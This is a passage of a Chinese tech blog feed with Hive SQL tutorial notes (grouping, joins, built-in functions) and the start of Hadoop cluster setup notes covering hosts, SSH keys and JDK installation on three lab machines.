<span class="hljs-keyword">from</span> t_usa_covid19;<br></code></pre></td></tr></table></figure><h4 id="5-3-3-GROUP-BY"><a href="#5-3-3-GROUP-BY" class="headerlink" title="5.3.3 GROUP BY"></a>5.3.3 GROUP BY</h4><p>GROUP BY语句用于结合聚合函数，<strong>根据一个或多个列对结果集进行分组</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 根据state州进行分组 统计每个州有多少个县county</span><br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(county) <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> count_date <span class="hljs-operator">=</span> &quot;2021-01-28&quot; <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> state;<br><br><span class="hljs-comment">-- 想看一下统计的结果是属于哪一个州的</span><br><span class="hljs-keyword">select</span> state,<span class="hljs-built_in">count</span>(county) <span class="hljs-keyword">as</span> county_nums <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> count_date <span class="hljs-operator">=</span> &quot;2021-01-28&quot; <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> state;<br><br><span class="hljs-comment">-- 被聚合函数应用</span><br><span class="hljs-keyword">select</span> state,<span class="hljs-built_in">count</span>(county),<span class="hljs-built_in">sum</span>(deaths) <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> count_date <span class="hljs-operator">=</span> &quot;2021-01-28&quot; <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> state;<br></code></pre></td></tr></table></figure><h4 id="5-3-4-HAVING"><a href="#5-3-4-HAVING" class="headerlink" title="5.3.4 HAVING"></a>5.3.4 HAVING</h4><p>由于SQL执行顺序决定where在分组前执行，所以where中不能使用聚合函数，比如下边的错误示范</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 错误示范-统计2021-01-28死亡病例数大于10000的州</span><br><span class="hljs-keyword">select</span> state,<span class="hljs-built_in">sum</span>(deaths) <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> count_date <span class="hljs-operator">=</span> &quot;2021-01-28&quot; <span class="hljs-keyword">and</span> <span class="hljs-built_in">sum</span>(deaths) <span class="hljs-operator">&gt;</span><span class="hljs-number">10000</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> state;<br></code></pre></td></tr></table></figure><p>例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 先where分组前过滤，再进行group by分组， 分组后每个分组结果集确定 再使用having过滤</span><br><span class="hljs-keyword">select</span> state,<span class="hljs-built_in">sum</span>(deaths) <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> count_date <span class="hljs-operator">=</span> &quot;2021-01-28&quot; <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> state <span class="hljs-keyword">having</span> <span class="hljs-built_in">sum</span>(deaths) <span class="hljs-operator">&gt;</span> <span class="hljs-number">10000</span>;<br><br><span class="hljs-comment">-- 这样写更好 即在group by的时候聚合函数已经作用得出结果 having直接引用结果过滤 不需要再单独计算一次了</span><br><span class="hljs-keyword">select</span> state,<span class="hljs-built_in">sum</span>(deaths) <span class="hljs-keyword">as</span> cnts <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> count_date <span class="hljs-operator">=</span> &quot;2021-01-28&quot; <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> state <span class="hljs-keyword">having</span> cnts<span class="hljs-operator">&gt;</span> <span class="hljs-number">10000</span>;<br></code></pre></td></tr></table></figure><h4 id="5-3-6-ORDER-BY"><a href="#5-3-6-ORDER-BY" class="headerlink" title="5.3.6 ORDER BY"></a>5.3.6 ORDER BY</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 根据确诊病例数升序排序 查询返回结果</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> cases;<br><br><span class="hljs-comment">-- 不写排序规则 默认就是asc升序</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> cases <span class="hljs-keyword">asc</span>;<br><br><span class="hljs-comment">-- 根据死亡病例数倒序排序 查询返回加州每个县的结果</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> state <span class="hljs-operator">=</span> &quot;California&quot; <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> cases <span class="hljs-keyword">desc</span>;<br></code></pre></td></tr></table></figure><h4 id="5-3-7-LIMIT"><a href="#5-3-7-LIMIT" class="headerlink" title="5.3.7 LIMIT"></a>5.3.7 LIMIT</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 没有限制返回2021.1.28 加州的所有记录</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> count_date <span class="hljs-operator">=</span> &quot;2021-01-28&quot; <span class="hljs-keyword">and</span> state <span class="hljs-operator">=</span>&quot;California&quot;;<br><br><span class="hljs-comment">-- 返回结果集的前5条</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> count_date <span class="hljs-operator">=</span> &quot;2021-01-28&quot; <span class="hljs-keyword">and</span> state <span class="hljs-operator">=</span>&quot;California&quot; limit <span class="hljs-number">5</span>;<br><br><span class="hljs-comment">-- 返回结果集从第1行开始 共3行</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> count_date <span class="hljs-operator">=</span> &quot;2021-01-28&quot; <span class="hljs-keyword">and</span> state <span class="hljs-operator">=</span>&quot;California&quot; limit <span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<br><span class="hljs-comment">-- 注意 第一个参数偏移量是从0开始的</span><br></code></pre></td></tr></table></figure><h4 id="5-3-8-执行顺序"><a href="#5-3-8-执行顺序" class="headerlink" title="5.3.8 执行顺序"></a>5.3.8 执行顺序</h4><ul><li><p><code>from</code> &gt; <code>where</code> &gt; <code>group</code>（含聚合）&gt; <code>having</code>  &gt; <code>order</code> &gt; <code>select</code></p></li><li><p>聚合语句(sum,min,max,avg,count)要比having子句优先执行</p></li><li><p>where子句在查询过程中执行优先级别优先于聚合语句(sum,min,max,avg,count)</p></li></ul><h3 id="5-4-JOIN"><a href="#5-4-JOIN" class="headerlink" title="5.4 JOIN"></a>5.4 JOIN</h3><ul><li><p>join_table</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">table_reference [<span class="hljs-keyword">INNER</span>] <span class="hljs-keyword">JOIN</span> table_factor [join_condition]<br><br><span class="hljs-operator">|</span> table_reference &#123;<span class="hljs-keyword">LEFT</span>&#125; [<span class="hljs-keyword">OUTER</span>] <span class="hljs-keyword">JOIN</span> table_reference join_condition<br></code></pre></td></tr></table></figure></li><li><p>join_condition:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ON</span> expression<br></code></pre></td></tr></table></figure></li></ul><h4 id="5-4-1-inner-join-内连接"><a href="#5-4-1-inner-join-内连接" class="headerlink" title="5.4.1 inner join 内连接"></a>5.4.1 inner join 内连接</h4><p>其中inner可以省略：inner join == join</p><img src="/2022/01/newpost-29/image-20220113175530805.png" class="" title="image-20220113175530805"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> e.id,e.name,e_a.city,e_a.street<br><span class="hljs-keyword">from</span> employee e <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> employee_address e_a<br><span class="hljs-keyword">on</span> e.id <span class="hljs-operator">=</span>e_a.id;<br><br><span class="hljs-comment">-- 等价于 inner join=join</span><br><span class="hljs-keyword">select</span> e.id,e.name,e_a.city,e_a.street<br><span class="hljs-keyword">from</span> employee e <span class="hljs-keyword">join</span> employee_address e_a<br><span class="hljs-keyword">on</span> e.id <span class="hljs-operator">=</span>e_a.id;<br><br><br><span class="hljs-comment">-- 等价于 隐式连接表示法</span><br><span class="hljs-keyword">select</span> e.id,e.name,e_a.city,e_a.street<br><span class="hljs-keyword">from</span> employee e, employee_address e_a<br><span class="hljs-keyword">where</span> e.id <span class="hljs-operator">=</span>e_a.id;<br></code></pre></td></tr></table></figure><h4 id="5-4-2-left-join-左连接"><a href="#5-4-2-left-join-左连接" class="headerlink" title="5.4.2 left join 左连接"></a>5.4.2 left join 左连接</h4><p>左外连接(Left Outer Join)或者左连接，其中outer可以省略</p><img src="/2022/01/newpost-29/image-20220113180014649.png" class="" title="image-20220113180014649"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> e.id,e.name,e_conn.phno,e_conn.email<br><span class="hljs-keyword">from</span> employee e <span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> employee_connection e_conn<br><span class="hljs-keyword">on</span> e.id <span class="hljs-operator">=</span>e_conn.id;<br><br><span class="hljs-comment">-- 等价于 left outer join</span><br><span class="hljs-keyword">select</span> e.id,e.name,e_conn.phno,e_conn.email<br><span class="hljs-keyword">from</span> employee e <span class="hljs-keyword">left</span> <span class="hljs-keyword">outer</span> <span class="hljs-keyword">join</span> employee_connection e_conn<br><span class="hljs-keyword">on</span> e.id <span class="hljs-operator">=</span>e_conn.id;<br></code></pre></td></tr></table></figure><h3 id="5-5-函数"><a href="#5-5-函数" class="headerlink" title="5.5 函数"></a>5.5 函数</h3><h4 id="5-5-1-概述"><a href="#5-5-1-概述" class="headerlink" title="5.5.1 概述"></a>5.5.1 概述</h4><ul><li><p>查看所有可用函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> functions;<br></code></pre></td></tr></table></figure></li><li><p>描述函数用法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">describe</span> <span class="hljs-keyword">function</span> extended xxxx;<br></code></pre></td></tr></table></figure><p>例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">describe</span> <span class="hljs-keyword">function</span> extended count;<br></code></pre></td></tr></table></figure></li><li><p>分类</p><img src="/2022/01/newpost-29/image-20220113180718829.png" class="" title="image-20220113180718829"></li></ul><h4 id="5-5-2-常用内置函数"><a href="#5-5-2-常用内置函数" class="headerlink" title="5.5.2 常用内置函数"></a>5.5.2 常用内置函数</h4><p><a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+UDF">官网</a></p><h5 id="String-Functions-字符串函数"><a href="#String-Functions-字符串函数" class="headerlink" title="String Functions 字符串函数"></a>String Functions 字符串函数</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> length(&quot;itcast&quot;);<br><span class="hljs-keyword">select</span> reverse(&quot;itcast&quot;);<br><br><span class="hljs-keyword">select</span> concat(&quot;angela&quot;,&quot;baby&quot;);<br><span class="hljs-comment">-- 带分隔符字符串连接函数：concat_ws(separator, [string | array(string)]+)</span><br><span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;www&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;itcast&#x27;</span>, <span class="hljs-string">&#x27;cn&#x27;</span>));<br><br><span class="hljs-comment">-- 字符串截取函数：substr(str, pos[, len]) 或者  substring(str, pos[, len])</span><br><span class="hljs-keyword">select</span> substr(&quot;angelababy&quot;,<span class="hljs-number">-2</span>); <span class="hljs-comment">-- pos是从1开始的索引，如果为负数则倒着数</span><br><span class="hljs-keyword">select</span> substr(&quot;angelababy&quot;,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>);<br><span class="hljs-comment">-- 分割字符串函数: split(str, regex)</span><br><span class="hljs-comment">-- split针对字符串数据进行切割  返回是数组array  可以通过数组的下标取内部的元素 注意下标从0开始的</span><br><span class="hljs-keyword">select</span> split(<span class="hljs-string">&#x27;apache hive&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">select</span> split(<span class="hljs-string">&#x27;apache hive&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>];<br><span class="hljs-keyword">select</span> split(<span class="hljs-string">&#x27;apache hive&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">1</span>];<br></code></pre></td></tr></table></figure><h5 id="Date-Functions-日期函数"><a href="#Date-Functions-日期函数" class="headerlink" title="Date Functions 日期函数"></a>Date Functions 日期函数</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 获取当前日期: current_date</span><br><span class="hljs-keyword">select</span> <span class="hljs-built_in">current_date</span>();<br><br><span class="hljs-comment">-- 获取当前UNIX时间戳函数: unix_timestamp</span><br><span class="hljs-keyword">select</span> unix_timestamp();<br><br><span class="hljs-comment">-- 日期转UNIX时间戳函数: unix_timestamp</span><br><span class="hljs-keyword">select</span> unix_timestamp(&quot;2011-12-07 13:01:03&quot;);<br><br><span class="hljs-comment">-- 指定格式日期转UNIX时间戳函数: unix_timestamp</span><br><span class="hljs-keyword">select</span> unix_timestamp(<span class="hljs-string">&#x27;20111207 13:01:03&#x27;</span>,<span class="hljs-string">&#x27;yyyyMMdd HH:mm:ss&#x27;</span>);<br><br><span class="hljs-comment">-- UNIX时间戳转日期函数: from_unixtime</span><br><span class="hljs-keyword">select</span> from_unixtime(<span class="hljs-number">1618238391</span>);<br><span class="hljs-keyword">select</span> from_unixtime(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;yyyy-MM-dd HH:mm:ss&#x27;</span>);<br><br><span class="hljs-comment">-- 日期比较函数: datediff  日期格式要求&#x27;yyyy-MM-dd HH:mm:ss&#x27; or &#x27;yyyy-MM-dd&#x27;</span><br><span class="hljs-keyword">select</span> datediff(<span class="hljs-string">&#x27;2012-12-08&#x27;</span>,<span class="hljs-string">&#x27;2012-05-09&#x27;</span>);<br><br><span class="hljs-comment">-- 日期增加函数: date_add</span><br><span class="hljs-keyword">select</span> date_add(<span class="hljs-string">&#x27;2012-02-28&#x27;</span>,<span class="hljs-number">10</span>);<br><br><span class="hljs-comment">-- 日期减少函数: date_sub</span><br><span class="hljs-keyword">select</span> date_sub(<span class="hljs-string">&#x27;2012-01-1&#x27;</span>,<span class="hljs-number">10</span>);<br></code></pre></td></tr></table></figure><p>相比视频额外扩展，工作中常用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 日期格式化</span><br><span class="hljs-keyword">select</span> date_format(<span class="hljs-built_in">current_date</span>(), <span class="hljs-string">&#x27;yyyy-MM&#x27;</span>);<br><span class="hljs-comment">-- 筛选在2022年1月创建的用户</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> userlist <span class="hljs-keyword">where</span> date_format(create_time, <span class="hljs-string">&#x27;yyyy-MM&#x27;</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;2022-01&#x27;</span>;<br></code></pre></td></tr></table></figure><h5 id="Mathematical-Functions-数学函数"><a href="#Mathematical-Functions-数学函数" class="headerlink" title="Mathematical Functions 数学函数"></a>Mathematical Functions 数学函数</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 取整函数: round  返回double类型的整数值部分 （遵循四舍五入）</span><br><span class="hljs-keyword">select</span> round(<span class="hljs-number">3.1415926</span>);<br><span class="hljs-comment">-- 指定精度取整函数: round(double a, int d) 返回指定精度d的double类型</span><br><span class="hljs-keyword">select</span> round(<span class="hljs-number">3.1415926</span>,<span class="hljs-number">4</span>);<br><span class="hljs-comment">-- 取随机数函数: rand 每次执行都不一样 返回一个0到1范围内的随机数</span><br><span class="hljs-keyword">select</span> rand();<br><span class="hljs-comment">-- 指定种子取随机数函数: rand(int seed) 得到一个稳定的随机数序列</span><br><span class="hljs-keyword">select</span> rand(<span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><h5 id="Conditional-Functions-条件函数"><a href="#Conditional-Functions-条件函数" class="headerlink" title="Conditional Functions 条件函数"></a>Conditional Functions 条件函数</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- if条件判断: if(boolean testCondition, T valueTrue, T valueFalseOrNull)</span><br><span class="hljs-keyword">select</span> if(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>,<span class="hljs-number">100</span>,<span class="hljs-number">200</span>);<br><span class="hljs-keyword">select</span> if(sex <span class="hljs-operator">=</span><span class="hljs-string">&#x27;男&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;W&#x27;</span>) <span class="hljs-keyword">from</span> student limit <span class="hljs-number">3</span>;<br><br><span class="hljs-comment">-- 条件转换函数: CASE a WHEN b THEN c [WHEN d THEN e]* [ELSE f] END</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-number">100</span> <span class="hljs-keyword">when</span> <span class="hljs-number">50</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;tom&#x27;</span> <span class="hljs-keyword">when</span> <span class="hljs-number">100</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;mary&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;tim&#x27;</span> <span class="hljs-keyword">end</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> sex <span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;男&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;male&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;female&#x27;</span> <span class="hljs-keyword">end</span> <span class="hljs-keyword">from</span> student limit <span class="hljs-number">3</span>;<br><br><span class="hljs-comment">-- 空值转换函数: nvl(T value, T default_value)</span><br><span class="hljs-keyword">select</span> nvl(&quot;allen&quot;,&quot;itcast&quot;);<br><span class="hljs-keyword">select</span> nvl(<span class="hljs-keyword">null</span>,&quot;itcast&quot;);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>大数据</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hadoop学习笔记</title>
    <link href="/2022/01/newpost-28/"/>
    <url>/2022/01/newpost-28/</url>
    
    <content type="html"><![CDATA[<p>本文基于B站视频教程<a href="https://www.bilibili.com/video/BV1CU4y1N7Sh">2022最新黑马程序员大数据Hadoop入门视频教程，最适合零基础自学的大数据Hadoop教程</a>，p19-p50，本文软件版本，行文顺序等可能与视频略有不同</p><span id="more"></span><p>所需安装包等可以关注【黑马程序员】公众号，回复【hadoop】获取</p><h1 id="一、开始前准备-机器与环境"><a href="#一、开始前准备-机器与环境" class="headerlink" title="一、开始前准备(机器与环境)"></a>一、开始前准备(机器与环境)</h1><h2 id="机器"><a href="#机器" class="headerlink" title="机器"></a>机器</h2><p>本机（windows）用来操作，加上三台机器（CentOS7 x64，都要开启SSH）用来搭建集群，分别取名node1、node2、node3，并配置hosts方便连接</p><p>本机（windows）打开<strong>C:\Windows\System32\drivers\etc\hosts</strong>文件，并追加以下内容，其中IP地址改为你自己的三台机器，可以不改，但是改了后操作更方便</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">###hadoop###</span><br>192.168.0.46 node1 node1.ifnxs.cn<br>192.168.0.49 node2 node2.ifnxs.cn<br>192.168.0.48 node3 node3.ifnxs.cn<br><span class="hljs-comment">###hadoop-end###</span><br></code></pre></td></tr></table></figure><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="三台机器共同操作："><a href="#三台机器共同操作：" class="headerlink" title="三台机器共同操作："></a>三台机器共同操作：</h3><h4 id="1-安装vim、ntpdate"><a href="#1-安装vim、ntpdate" class="headerlink" title="1. 安装vim、ntpdate"></a>1. 安装<strong>vim</strong>、<strong>ntpdate</strong></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum -y install vim<br>yum -y install ntpdate<br></code></pre></td></tr></table></figure><h4 id="2-关闭防火墙（生产环境请不要这样）"><a href="#2-关闭防火墙（生产环境请不要这样）" class="headerlink" title="2. 关闭防火墙（生产环境请不要这样）"></a>2. 关闭防火墙（生产环境请不要这样）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl stop firewalld.service<br>systemctl disable firewalld.service<br></code></pre></td></tr></table></figure><h4 id="3-配置本机名"><a href="#3-配置本机名" class="headerlink" title="3. 配置本机名"></a>3. 配置本机名</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/hostname<br></code></pre></td></tr></table></figure><p>分别改为【node1.ifnxs.cn】、【node2.ifnxs.cn】、【node3.ifnxs.cn】</p><img src="/2022/01/newpost-28/image-20220105110945912.png" class="" title="image-20220105110945912"><p><strong>配置完建议每台机器都重启一下，不然后面会遇到一个坑</strong></p><h4 id="4-修改hosts"><a href="#4-修改hosts" class="headerlink" title="4. 修改hosts"></a>4. 修改hosts</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/hosts<br></code></pre></td></tr></table></figure><p>追加以下内容，其中IP地址改为你自己的三台机器</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini">192.168.0.46 node1 node1.ifnxs.cn<br>192.168.0.49 node2 node2.ifnxs.cn<br>192.168.0.48 node3 node3.ifnxs.cn<br></code></pre></td></tr></table></figure><img src="/2022/01/newpost-28/image-20220105111339690.png" class="" title="image-20220105111339690"><h4 id="5-同步时间"><a href="#5-同步时间" class="headerlink" title="5. 同步时间"></a>5. 同步时间</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ntpdate ntp5.aliyun.com<br></code></pre></td></tr></table></figure><h4 id="6-创建统一工作目录"><a href="#6-创建统一工作目录" class="headerlink" title="6. 创建统一工作目录"></a>6. 创建统一工作目录</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir -p /export/data # 数据<br>mkdir -p /export/server # 服务<br>mkdir -p /export/software # 软件<br></code></pre></td></tr></table></figure><h4 id="7-node1-gt-node1-node2-node3免密登录"><a href="#7-node1-gt-node1-node2-node3免密登录" class="headerlink" title="7. node1-&gt;node1/node2/node3免密登录"></a>7. node1-&gt;node1/node2/node3免密登录</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh-keygen # 四个回车<br>ssh-copy-id node1 # yes 密码<br>ssh-copy-id node2 # yes 密码<br>ssh-copy-id node3 # yes 密码<br></code></pre></td></tr></table></figure><h4 id="8-安装JDK1-8"><a href="#8-安装JDK1-8" class="headerlink" title="8. 安装JDK1.8"></a>8. 安装JDK1.8</h4><h5 id="8-1-下载jdk-8u311-linux-x64"><a href="#8-1-下载jdk-8u311-linux-x64" class="headerlink" title="8.1 下载jdk-8u311-linux-x64"></a>8.1 下载jdk-8u311-linux-x64</h5><p>官方下载链接(需要注册，可能网速慢)：</p><p><a href="https://www.oracle.com/java/technologies/downloads/">https://www.oracle.com/java/technologies/downloads/</a></p><img src="/2022/01/newpost-28/image-20220105115350394.png" class="" title="image-20220105115350394"><p>百度网盘：</p><p>链接：<a href="https://pan.baidu.com/s/176N837BQXyUoIt7HvF0c0A">https://pan.baidu.com/s/176N837BQXyUoIt7HvF0c0A</a><br>提取码：0ld6</p><h5 id="8-2-安装"><a href="#8-2-安装" class="headerlink" title="8.2 安装"></a>8.2 安装</h5><p>上传安装包到**/export/server/**，然后解压</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /export/server/<br>tar -zxvf jdk-8u311-linux-x64.tar.gz<br></code></pre></td></tr></table></figure><p>编辑环境变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/profile<br></code></pre></td></tr></table></figure><p>结尾追加</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> JAVA_HOME=/export/server/jdk1.8.0_311<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$JAVA_HOME</span>/bin<br><span class="hljs-built_in">export</span> CALSSPATH=.:<span class="hljs-variable">$JAVA_HOME</span>/lib/dt.jar:<span class="hljs-variable">$JAVA_HOME</span>/lib/tools.jar<br></code></pre></td></tr></table></figure><p>拷贝到另外两台机器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">scp -r /export/server/jdk1.8.0_311/ root@node2:/export/server/<br>scp /etc/profile root@node2:/etc/<br>scp -r /export/server/jdk1.8.0_311/ root@node3:/export/server/<br>scp /etc/profile 